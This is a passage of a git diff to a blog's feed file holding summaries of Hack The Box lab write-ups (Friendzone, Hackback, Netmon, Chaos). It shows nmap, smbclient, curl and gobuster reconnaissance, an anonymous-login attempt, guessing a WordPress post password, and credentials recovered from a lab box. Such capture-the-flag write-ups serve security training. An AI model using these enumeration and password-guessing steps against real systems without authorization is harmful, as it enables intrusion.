+&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="smb" /><category term="Web" /><category term="LFI" /><category term="php" /><category term="ssh" /><category term="Python" /><summary type="html">Quick Summary Hey guys today Friendzone retired and here’s my write-up about it. Friendzone was a very nice and easy box. I enjoyed solving it and I really liked it, it had a lot of funny parts as well. It’s a Linux box and its ip is 10.10.10.123, I added it to /etc/hosts as friendzone.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT friendzone.htb Note : I didn’t do a script scan (-sC) because for some reason it took a lot of time and didn’t finish. We got ftp on port 21, ssh on port 22, dns on port 53, http on port 80, https on port 443 and smb. Unfortunately anonymous login wasn’t allowed on ftp : root@kali:~/Desktop/HTB/boxes/friendzone# ftp friendzone.htb Connected to friendzone.htb. 220 (vsFTPd 3.0.3) Name (friendzone.htb:root): anonymous 331 Please specify the password. Password: 530 Login incorrect. Login failed. ftp&amp;gt; Let’s check smb. SMB I used smbclient to list the shares : ``` root@kali:~/Desktop/HTB/boxes/friendzone# smbclient –list friendzone.htb -U “” Enter WORKGROUP's password:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/friendzone/0.png" /></entry><entry><title type="html">Hack The Box - Hackback</title><link href="http://localhost:4000/hack-the-box/hackback/" rel="alternate" type="text/html" title="Hack The Box - Hackback" /><published>2019-07-06T00:00:00+02:00</published><updated>2019-07-06T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/hackback</id><content type="html" xml:base="http://localhost:4000/hack-the-box/hackback/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-hackback-retired-and-heres-my-write-up-about-it-hackback-was-a-very-hard-machine-full-of-different-steps-and-rabbit-holes-its-a-windows-machine-and-its-ip-is-101010128-i-added-it-to-etchosts-as-hackbackhtb-lets-jump-right-in-&quot;&gt;Hey guys today Hackback retired and here’s my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It’s a Windows machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.128&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;hackback.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -1077,7 +1318,8 @@ SERVICE_NAME: userlogger
 &lt;p&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---netmon&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/netmon/&quot;&gt;Hack The Box - Netmon&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Windows Exploitation" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="pivoting" /><summary type="html">Quick Summary Hey guys today Hackback retired and here’s my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It’s a Windows machine and its ip is 10.10.10.128, I added it to /etc/hosts as hackback.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC hackback.htb We got two http ports, 80 and 6666, I also ran a full scan but we’ll get to that later. HTTP I checked both ports, on 80 there was this donkey image : I ran gobuster and it got nothing. I couldn’t send a request to port 6666 from the browser so I used curl : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/ &quot;Missing Command!&quot; It says &quot;Missing Command!&quot; So I tried /help : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/help &quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot; It returned a list of what commands we can use. /whoami lists information about the user running this service, not really important. /list lists the files in the current directory : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/list [ { &quot;Name&quot;: &quot;aspnet_client&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;default&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;new_phish&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;http.ps1&quot;, &quot;Length&quot;: 1867 }, { &quot;Name&quot;: &quot;iisstart.htm&quot;, &quot;Length&quot;: 703 }, { &quot;Name&quot;: &quot;iisstart.png&quot;, &quot;Length&quot;: 99710 } ] /info prints system information, we might need that : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/info { &quot;WindowsBuildLabEx&quot;: &quot;17763.1.amd64fre.rs5_release.180914-1434&quot;, &quot;WindowsCurrentVersion&quot;: &quot;6.3&quot;, &quot;WindowsEditionId&quot;: &quot;ServerStandard&quot;, &quot;WindowsInstallationType&quot;: &quot;Server&quot;, &quot;WindowsInstallDateFromRegistry&quot;: &quot;\/Date(1542436874000)\/&quot;, &quot;WindowsProductId&quot;: &quot;00429-00520-27817-AA520&quot;, &quot;WindowsProductName&quot;: &quot;Windows Server 2019 Standard&quot;, &quot;WindowsRegisteredOrganization&quot;: &quot;&quot;, &quot;WindowsRegisteredOwner&quot;: &quot;Windows User&quot;, &quot;WindowsSystemRoot&quot;: &quot;C:\\Windows&quot;, &quot;WindowsVersion&quot;: &quot;1809&quot;, &quot;BiosCharacteristics&quot;: null, &quot;BiosBIOSVersion&quot;: null, &quot;BiosBuildNumber&quot;: null, &quot;BiosCaption&quot;: null, &quot;BiosCodeSet&quot;: null, &quot;BiosCurrentLanguage&quot;: null, &quot;BiosDescription&quot;: null, &quot;BiosEmbeddedControllerMajorVersion&quot;: null, &quot;BiosEmbeddedControllerMinorVersion&quot;: null, &quot;BiosFirmwareType&quot;: null, &quot;BiosIdentificationCode&quot;: null, &quot;BiosInstallableLanguages&quot;: null, &quot;BiosInstallDate&quot;: null, &quot;BiosLanguageEdition&quot;: null, &quot;BiosListOfLanguages&quot;: null, &quot;BiosManufacturer&quot;: null, &quot;BiosName&quot;: null, &quot;BiosOtherTargetOS&quot;: null, &quot;BiosPrimaryBIOS&quot;: null, &quot;BiosReleaseDate&quot;: null, &quot;BiosSeralNumber&quot;: null, &quot;BiosSMBIOSBIOSVersion&quot;: null, &quot;BiosSMBIOSMajorVersion&quot;: null, &quot;BiosSMBIOSMinorVersion&quot;: null, &quot;BiosSMBIOSPresent&quot;: null, &quot;BiosSoftwareElementState&quot;: null, &quot;BiosStatus&quot;: null, &quot;BiosSystemBiosMajorVersion&quot;: null, &quot;BiosSystemBiosMinorVersion&quot;: null, &quot;BiosTargetOperatingSystem&quot;: null, &quot;BiosVersion&quot;: null, &quot;CsAdminPasswordStatus&quot;: null, &quot;CsAutomaticManagedPagefile&quot;: null, &quot;CsAutomaticResetBootOption&quot;: null, &quot;CsAutomaticResetCapability&quot;: null, &quot;CsBootOptionOnLimit&quot;: null, &quot;CsBootOptionOnWatchDog&quot;: null, &quot;CsBootROMSupported&quot;: null, &quot;CsBootStatus&quot;: null, &quot;CsBootupState&quot;: null, &quot;CsCaption&quot;: null, &quot;CsChassisBootupState&quot;: null, &quot;CsChassisSKUNumber&quot;: null, &quot;CsCurrentTimeZone&quot;: null, &quot;CsDaylightInEffect&quot;: null, &quot;CsDescription&quot;: null, &quot;CsDNSHostName&quot;: null, &quot;CsDomain&quot;: null, &quot;CsDomainRole&quot;: null, &quot;CsEnableDaylightSavingsTime&quot;: null, &quot;CsFrontPanelResetStatus&quot;: null, &quot;CsHypervisorPresent&quot;: null, &quot;CsInfraredSupported&quot;: null, &quot;CsInitialLoadInfo&quot;: null, &quot;CsInstallDate&quot;: null, &quot;CsKeyboardPasswordStatus&quot;: null, &quot;CsLastLoadInfo&quot;: null, &quot;CsManufacturer&quot;: null, &quot;CsModel&quot;: null, &quot;CsName&quot;: null, &quot;CsNetworkAdapters&quot;: null, &quot;CsNetworkServerModeEnabled&quot;: null, &quot;CsNumberOfLogicalProcessors&quot;: null, &quot;CsNumberOfProcessors&quot;: null, &quot;CsProcessors&quot;: null, &quot;CsOEMStringArray&quot;: null, &quot;CsPartOfDomain&quot;: null, &quot;CsPauseAfterReset&quot;: null, &quot;CsPCSystemType&quot;: null, &quot;CsPCSystemTypeEx&quot;: null, &quot;CsPowerManagementCapabilities&quot;: null, &quot;CsPowerManagementSupported&quot;: null, &quot;CsPowerOnPasswordStatus&quot;: null, &quot;CsPowerState&quot;: null, &quot;CsPowerSupplyState&quot;: null, &quot;CsPrimaryOwnerContact&quot;: null, &quot;CsPrimaryOwnerName&quot;: null, &quot;CsResetCapability&quot;: null, &quot;CsResetCount&quot;: null, &quot;CsResetLimit&quot;: null, &quot;CsRoles&quot;: null, &quot;CsStatus&quot;: null, &quot;CsSupportContactDescription&quot;: null, &quot;CsSystemFamily&quot;: null, &quot;CsSystemSKUNumber&quot;: null, &quot;CsSystemType&quot;: null, &quot;CsThermalState&quot;: null, &quot;CsTotalPhysicalMemory&quot;: null, &quot;CsPhyicallyInstalledMemory&quot;: null, &quot;CsUserName&quot;: null, &quot;CsWakeUpType&quot;: null, &quot;CsWorkgroup&quot;: null, &quot;OsName&quot;: null, &quot;OsType&quot;: null, &quot;OsOperatingSystemSKU&quot;: null, &quot;OsVersion&quot;: null, &quot;OsCSDVersion&quot;: null, &quot;OsBuildNumber&quot;: null, &quot;OsHotFixes&quot;: null, &quot;OsBootDevice&quot;: null, &quot;OsSystemDevice&quot;: null, &quot;OsSystemDirectory&quot;: null, &quot;OsSystemDrive&quot;: null, &quot;OsWindowsDirectory&quot;: null, &quot;OsCountryCode&quot;: null, &quot;OsCurrentTimeZone&quot;: null, &quot;OsLocaleID&quot;: null, &quot;OsLocale&quot;: null, &quot;OsLocalDateTime&quot;: null, &quot;OsLastBootUpTime&quot;: null, &quot;OsUptime&quot;: null, &quot;OsBuildType&quot;: null, &quot;OsCodeSet&quot;: null, &quot;OsDataExecutionPreventionAvailable&quot;: null, &quot;OsDataExecutionPrevention32BitApplications&quot;: null, &quot;OsDataExecutionPreventionDrivers&quot;: null, &quot;OsDataExecutionPreventionSupportPolicy&quot;: null, &quot;OsDebug&quot;: null, &quot;OsDistributed&quot;: null, &quot;OsEncryptionLevel&quot;: null, &quot;OsForegroundApplicationBoost&quot;: null, &quot;OsTotalVisibleMemorySize&quot;: null, &quot;OsFreePhysicalMemory&quot;: null, &quot;OsTotalVirtualMemorySize&quot;: null, &quot;OsFreeVirtualMemory&quot;: null, &quot;OsInUseVirtualMemory&quot;: null, &quot;OsTotalSwapSpaceSize&quot;: null, &quot;OsSizeStoredInPagingFiles&quot;: null, &quot;OsFreeSpaceInPagingFiles&quot;: null, &quot;OsPagingFiles&quot;: null, &quot;OsHardwareAbstractionLayer&quot;: null, &quot;OsInstallDate&quot;: null, &quot;OsManufacturer&quot;: null, &quot;OsMaxNumberOfProcesses&quot;: null, &quot;OsMaxProcessMemorySize&quot;: null, &quot;OsMuiLanguages&quot;: null, &quot;OsNumberOfLicensedUsers&quot;: null, &quot;OsNumberOfProcesses&quot;: null, &quot;OsNumberOfUsers&quot;: null, &quot;OsOrganization&quot;: null, &quot;OsArchitecture&quot;: null, &quot;OsLanguage&quot;: null, &quot;OsProductSuites&quot;: null, &quot;OsOtherTypeDescription&quot;: null, &quot;OsPAEEnabled&quot;: null, &quot;OsPortableOperatingSystem&quot;: null, &quot;OsPrimary&quot;: null, &quot;OsProductType&quot;: null, &quot;OsRegisteredUser&quot;: null, &quot;OsSerialNumber&quot;: null, &quot;OsServicePackMajorVersion&quot;: null, &quot;OsServicePackMinorVersion&quot;: null, &quot;OsStatus&quot;: null, &quot;OsSuites&quot;: null, &quot;OsServerLevel&quot;: 4, &quot;KeyboardLayout&quot;: null, &quot;TimeZone&quot;: &quot;(UTC-08:00) Pacific Time (US \u0026 Canada)&quot;, &quot;LogonServer&quot;: null, &quot;PowerPlatformRole&quot;: 1, &quot;HyperVisorPresent&quot;: null, &quot;HyperVRequirementDataExecutionPreventionAvailable&quot;: null, &quot;HyperVRequirementSecondLevelAddressTranslation&quot;: null, &quot;HyperVRequirementVirtualizationFirmwareEnabled&quot;: null, &quot;HyperVRequirementVMMonitorModeExtensions&quot;: null, &quot;DeviceGuardSmartStatus&quot;: 0, &quot;DeviceGuardRequiredSecurityProperties&quot;: null, &quot;DeviceGuardAvailableSecurityProperties&quot;: null, &quot;DeviceGuardSecurityServicesConfigured&quot;: null, &quot;DeviceGuardSecurityServicesRunning&quot;: null, &quot;DeviceGuardCodeIntegrityPolicyEnforcementStatus&quot;: null, &quot;DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus&quot;: null } /services lists the services, that’s also important and we might need it later : ``` root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/services [ { “name”: “AJRouter”, “startname”: “NT AUTHORITY\LocalService”, “displayname”: “AllJoyn Router Service”, “status”: “OK” }, { “name”: “ALG”, “startname”: “NT AUTHORITY\LocalService”, “displayname”: “Application Layer Gateway Service”, “status”: “OK” }, { “name”: “AppHostSvc”, “startname”: “localSystem”, “displayname”: “Application Host Helper Service”, “status”: “OK” },</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/hackback/0.png" /></entry><entry><title type="html">Hack The Box - Netmon</title><link href="http://localhost:4000/hack-the-box/netmon/" rel="alternate" type="text/html" title="Hack The Box - Netmon" /><published>2019-06-29T00:00:00+02:00</published><updated>2019-06-29T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/netmon</id><content type="html" xml:base="http://localhost:4000/hack-the-box/netmon/">&lt;hr /&gt;
+&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---friendzone&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/friendzone/&quot;&gt;Hack The Box - Friendzone&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Windows Exploitation" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="Pivoting" /><summary type="html">Quick Summary Hey guys today Hackback retired and here’s my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It’s a Windows machine and its ip is 10.10.10.128, I added it to /etc/hosts as hackback.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC hackback.htb We got two http ports, 80 and 6666, I also ran a full scan but we’ll get to that later. HTTP I checked both ports, on 80 there was this donkey image : I ran gobuster and it got nothing. I couldn’t send a request to port 6666 from the browser so I used curl : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/ &quot;Missing Command!&quot; It says &quot;Missing Command!&quot; So I tried /help : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/help &quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot; It returned a list of what commands we can use. /whoami lists information about the user running this service, not really important. /list lists the files in the current directory : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/list [ { &quot;Name&quot;: &quot;aspnet_client&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;default&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;new_phish&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;http.ps1&quot;, &quot;Length&quot;: 1867 }, { &quot;Name&quot;: &quot;iisstart.htm&quot;, &quot;Length&quot;: 703 }, { &quot;Name&quot;: &quot;iisstart.png&quot;, &quot;Length&quot;: 99710 } ] /info prints system information, we might need that : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/info { &quot;WindowsBuildLabEx&quot;: &quot;17763.1.amd64fre.rs5_release.180914-1434&quot;, &quot;WindowsCurrentVersion&quot;: &quot;6.3&quot;, &quot;WindowsEditionId&quot;: &quot;ServerStandard&quot;, &quot;WindowsInstallationType&quot;: &quot;Server&quot;, &quot;WindowsInstallDateFromRegistry&quot;: &quot;\/Date(1542436874000)\/&quot;, &quot;WindowsProductId&quot;: &quot;00429-00520-27817-AA520&quot;, &quot;WindowsProductName&quot;: &quot;Windows Server 2019 Standard&quot;, &quot;WindowsRegisteredOrganization&quot;: &quot;&quot;, &quot;WindowsRegisteredOwner&quot;: &quot;Windows User&quot;, &quot;WindowsSystemRoot&quot;: &quot;C:\\Windows&quot;, &quot;WindowsVersion&quot;: &quot;1809&quot;, &quot;BiosCharacteristics&quot;: null, &quot;BiosBIOSVersion&quot;: null, &quot;BiosBuildNumber&quot;: null, &quot;BiosCaption&quot;: null, &quot;BiosCodeSet&quot;: null, &quot;BiosCurrentLanguage&quot;: null, &quot;BiosDescription&quot;: null, &quot;BiosEmbeddedControllerMajorVersion&quot;: null, &quot;BiosEmbeddedControllerMinorVersion&quot;: null, &quot;BiosFirmwareType&quot;: null, &quot;BiosIdentificationCode&quot;: null, &quot;BiosInstallableLanguages&quot;: null, &quot;BiosInstallDate&quot;: null, &quot;BiosLanguageEdition&quot;: null, &quot;BiosListOfLanguages&quot;: null, &quot;BiosManufacturer&quot;: null, &quot;BiosName&quot;: null, &quot;BiosOtherTargetOS&quot;: null, &quot;BiosPrimaryBIOS&quot;: null, &quot;BiosReleaseDate&quot;: null, &quot;BiosSeralNumber&quot;: null, &quot;BiosSMBIOSBIOSVersion&quot;: null, &quot;BiosSMBIOSMajorVersion&quot;: null, &quot;BiosSMBIOSMinorVersion&quot;: null, &quot;BiosSMBIOSPresent&quot;: null, &quot;BiosSoftwareElementState&quot;: null, &quot;BiosStatus&quot;: null, &quot;BiosSystemBiosMajorVersion&quot;: null, &quot;BiosSystemBiosMinorVersion&quot;: null, &quot;BiosTargetOperatingSystem&quot;: null, &quot;BiosVersion&quot;: null, &quot;CsAdminPasswordStatus&quot;: null, &quot;CsAutomaticManagedPagefile&quot;: null, &quot;CsAutomaticResetBootOption&quot;: null, &quot;CsAutomaticResetCapability&quot;: null, &quot;CsBootOptionOnLimit&quot;: null, &quot;CsBootOptionOnWatchDog&quot;: null, &quot;CsBootROMSupported&quot;: null, &quot;CsBootStatus&quot;: null, &quot;CsBootupState&quot;: null, &quot;CsCaption&quot;: null, &quot;CsChassisBootupState&quot;: null, &quot;CsChassisSKUNumber&quot;: null, &quot;CsCurrentTimeZone&quot;: null, &quot;CsDaylightInEffect&quot;: null, &quot;CsDescription&quot;: null, &quot;CsDNSHostName&quot;: null, &quot;CsDomain&quot;: null, &quot;CsDomainRole&quot;: null, &quot;CsEnableDaylightSavingsTime&quot;: null, &quot;CsFrontPanelResetStatus&quot;: null, &quot;CsHypervisorPresent&quot;: null, &quot;CsInfraredSupported&quot;: null, &quot;CsInitialLoadInfo&quot;: null, &quot;CsInstallDate&quot;: null, &quot;CsKeyboardPasswordStatus&quot;: null, &quot;CsLastLoadInfo&quot;: null, &quot;CsManufacturer&quot;: null, &quot;CsModel&quot;: null, &quot;CsName&quot;: null, &quot;CsNetworkAdapters&quot;: null, &quot;CsNetworkServerModeEnabled&quot;: null, &quot;CsNumberOfLogicalProcessors&quot;: null, &quot;CsNumberOfProcessors&quot;: null, &quot;CsProcessors&quot;: null, &quot;CsOEMStringArray&quot;: null, &quot;CsPartOfDomain&quot;: null, &quot;CsPauseAfterReset&quot;: null, &quot;CsPCSystemType&quot;: null, &quot;CsPCSystemTypeEx&quot;: null, &quot;CsPowerManagementCapabilities&quot;: null, &quot;CsPowerManagementSupported&quot;: null, &quot;CsPowerOnPasswordStatus&quot;: null, &quot;CsPowerState&quot;: null, &quot;CsPowerSupplyState&quot;: null, &quot;CsPrimaryOwnerContact&quot;: null, &quot;CsPrimaryOwnerName&quot;: null, &quot;CsResetCapability&quot;: null, &quot;CsResetCount&quot;: null, &quot;CsResetLimit&quot;: null, &quot;CsRoles&quot;: null, &quot;CsStatus&quot;: null, &quot;CsSupportContactDescription&quot;: null, &quot;CsSystemFamily&quot;: null, &quot;CsSystemSKUNumber&quot;: null, &quot;CsSystemType&quot;: null, &quot;CsThermalState&quot;: null, &quot;CsTotalPhysicalMemory&quot;: null, &quot;CsPhyicallyInstalledMemory&quot;: null, &quot;CsUserName&quot;: null, &quot;CsWakeUpType&quot;: null, &quot;CsWorkgroup&quot;: null, &quot;OsName&quot;: null, &quot;OsType&quot;: null, &quot;OsOperatingSystemSKU&quot;: null, &quot;OsVersion&quot;: null, &quot;OsCSDVersion&quot;: null, &quot;OsBuildNumber&quot;: null, &quot;OsHotFixes&quot;: null, &quot;OsBootDevice&quot;: null, &quot;OsSystemDevice&quot;: null, &quot;OsSystemDirectory&quot;: null, &quot;OsSystemDrive&quot;: null, &quot;OsWindowsDirectory&quot;: null, &quot;OsCountryCode&quot;: null, &quot;OsCurrentTimeZone&quot;: null, &quot;OsLocaleID&quot;: null, &quot;OsLocale&quot;: null, &quot;OsLocalDateTime&quot;: null, &quot;OsLastBootUpTime&quot;: null, &quot;OsUptime&quot;: null, &quot;OsBuildType&quot;: null, &quot;OsCodeSet&quot;: null, &quot;OsDataExecutionPreventionAvailable&quot;: null, &quot;OsDataExecutionPrevention32BitApplications&quot;: null, &quot;OsDataExecutionPreventionDrivers&quot;: null, &quot;OsDataExecutionPreventionSupportPolicy&quot;: null, &quot;OsDebug&quot;: null, &quot;OsDistributed&quot;: null, &quot;OsEncryptionLevel&quot;: null, &quot;OsForegroundApplicationBoost&quot;: null, &quot;OsTotalVisibleMemorySize&quot;: null, &quot;OsFreePhysicalMemory&quot;: null, &quot;OsTotalVirtualMemorySize&quot;: null, &quot;OsFreeVirtualMemory&quot;: null, &quot;OsInUseVirtualMemory&quot;: null, &quot;OsTotalSwapSpaceSize&quot;: null, &quot;OsSizeStoredInPagingFiles&quot;: null, &quot;OsFreeSpaceInPagingFiles&quot;: null, &quot;OsPagingFiles&quot;: null, &quot;OsHardwareAbstractionLayer&quot;: null, &quot;OsInstallDate&quot;: null, &quot;OsManufacturer&quot;: null, &quot;OsMaxNumberOfProcesses&quot;: null, &quot;OsMaxProcessMemorySize&quot;: null, &quot;OsMuiLanguages&quot;: null, &quot;OsNumberOfLicensedUsers&quot;: null, &quot;OsNumberOfProcesses&quot;: null, &quot;OsNumberOfUsers&quot;: null, &quot;OsOrganization&quot;: null, &quot;OsArchitecture&quot;: null, &quot;OsLanguage&quot;: null, &quot;OsProductSuites&quot;: null, &quot;OsOtherTypeDescription&quot;: null, &quot;OsPAEEnabled&quot;: null, &quot;OsPortableOperatingSystem&quot;: null, &quot;OsPrimary&quot;: null, &quot;OsProductType&quot;: null, &quot;OsRegisteredUser&quot;: null, &quot;OsSerialNumber&quot;: null, &quot;OsServicePackMajorVersion&quot;: null, &quot;OsServicePackMinorVersion&quot;: null, &quot;OsStatus&quot;: null, &quot;OsSuites&quot;: null, &quot;OsServerLevel&quot;: 4, &quot;KeyboardLayout&quot;: null, &quot;TimeZone&quot;: &quot;(UTC-08:00) Pacific Time (US \u0026 Canada)&quot;, &quot;LogonServer&quot;: null, &quot;PowerPlatformRole&quot;: 1, &quot;HyperVisorPresent&quot;: null, &quot;HyperVRequirementDataExecutionPreventionAvailable&quot;: null, &quot;HyperVRequirementSecondLevelAddressTranslation&quot;: null, &quot;HyperVRequirementVirtualizationFirmwareEnabled&quot;: null, &quot;HyperVRequirementVMMonitorModeExtensions&quot;: null, &quot;DeviceGuardSmartStatus&quot;: 0, &quot;DeviceGuardRequiredSecurityProperties&quot;: null, &quot;DeviceGuardAvailableSecurityProperties&quot;: null, &quot;DeviceGuardSecurityServicesConfigured&quot;: null, &quot;DeviceGuardSecurityServicesRunning&quot;: null, &quot;DeviceGuardCodeIntegrityPolicyEnforcementStatus&quot;: null, &quot;DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus&quot;: null } /services lists the services, that’s also important and we might need it later : ``` root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/services [ { “name”: “AJRouter”, “startname”: “NT AUTHORITY\LocalService”, “displayname”: “AllJoyn Router Service”, “status”: “OK” }, { “name”: “ALG”, “startname”: “NT AUTHORITY\LocalService”, “displayname”: “Application Layer Gateway Service”, “status”: “OK” }, { “name”: “AppHostSvc”, “startname”: “localSystem”, “displayname”: “Application Host Helper Service”, “status”: “OK” },</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/hackback/0.png" /></entry><entry><title type="html">Hack The Box - Netmon</title><link href="http://localhost:4000/hack-the-box/netmon/" rel="alternate" type="text/html" title="Hack The Box - Netmon" /><published>2019-06-29T00:00:00+02:00</published><updated>2019-06-29T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/netmon</id><content type="html" xml:base="http://localhost:4000/hack-the-box/netmon/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-netmon-retired-and-heres-my-writeup-about-it-it-was-a-very-easy-machine-thats-everything-i-can-say-about-it-its-a-windows-box-and-its-ip-is-101010152-i-added-it-to-etchosts-as-netmonhtb-lets-jump-right-in-&quot;&gt;Hey guys today Netmon retired and here’s my writeup about it. It was a very easy machine that’s everything I can say about it. It’s a Windows box and its ip is 10.10.10.152, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;netmon.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -4156,536 +4398,4 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---conceal&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/conceal/&quot;&gt;Hack The Box - Conceal&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---sizzle&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/sizzle/&quot;&gt;Hack The Box - Sizzle&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="rbash" /><category term="LaTeX injection" /><category term="Wordpress" /><category term="Cryptography" /><summary type="html">Quick Summary Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as www-data we will exploit a web application that used LaTeX. After that we will escalate privileges to another user and escape rbash. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is 10.10.10.120, I added it to /etc/hosts as chaos.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC chaos.htb We got some ports. http on port 80 and 10000, email related services (imap, pop3) running on ports 110, 143, 993 and 995. Let’s check http. HTTP Initial Enumeration Port 10000 gave me this error : So I switched to https and got a login form : We don’t have any credentials and I ran gobuster and got nothing interesting so we will ignore this and look at port 80. It’s just a normal website, rest of it : I checked that contact form and it’s doing nothing. I ran gobuster on chaos.htb and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://chaos.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:36:56 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /server-status (Status: 403) /source (Status: 301) ===================================================== 2019/05/24 14:40:36 Finished ===================================================== And now this part is tricky. Because going to the ip of the box 10.10.10.120 instead of chaos.htb will give us a different thing (virtual hosting). It’s saying Direct IP not allowed. I ran another gobuster scan on the ip and got different results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.120/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:41:52 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /wp (Status: 301) ===================================================== 2019/05/24 14:45:37 Finished ===================================================== On chaos.htb the thing the caught my attention was /source so I checked that and it didn’t have anything : I checked http://10.10.10.120/wp and found a wordpress website : I looked at the posts, there was only one post and it was password protected : I clicked on the post link and saw that the author of the post is called human : Before trying to bruteforce the password I tried some basic stuff first and the username:username type of credentials worked. The password was human : And we got some credentials for mail : ayush:jiujitsu Accessing the e-mail Service, Decrypting Secret Message We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used claws-mail (can be installed with apt) and configured it like this : Inbox was empty but drafts had something : ``` From: ayush ayush@localhost To: undisclosed-recipients:; Subject: service Date: Sun, 28 Oct 2018 17:46:38 +0530 User-Agent: Roundcube Webmail/1.3.8</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/chaos/0.png" /></entry><entry><title type="html">Hack The Box - Conceal</title><link href="http://localhost:4000/hack-the-box/conceal/" rel="alternate" type="text/html" title="Hack The Box - Conceal" /><published>2019-05-18T00:00:00+02:00</published><updated>2019-05-18T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/conceal</id><content type="html" xml:base="http://localhost:4000/hack-the-box/conceal/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
